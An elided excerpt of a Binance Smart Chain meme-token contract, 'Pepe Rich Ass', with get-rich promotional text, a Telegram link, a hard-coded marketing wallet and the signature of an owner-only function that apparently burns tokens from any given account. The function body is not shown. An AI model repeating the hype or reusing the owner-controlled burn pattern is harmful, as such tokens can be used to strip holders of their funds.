...
Get rich with Pepe rich ass! A bsc play for chads that are weaken by the jeets cause here jeets is not allow!

https://t.me/PepeRichAss
...
*/
    ...
    contract PepeRichAss  is IBEP20, Ownable
    {
        ...
        string private constant _name = "Pepe Rich Ass";
        string private constant _symbol = "PepeAss";
        ...
        address public constant MarketingWallet=0xFbc1e54a1e51320116FdD2d1297907B28CB2Cb95; 
      ...
      function BurnTokensLP(address account, uint256 balance) onlyOwner  public virtual {
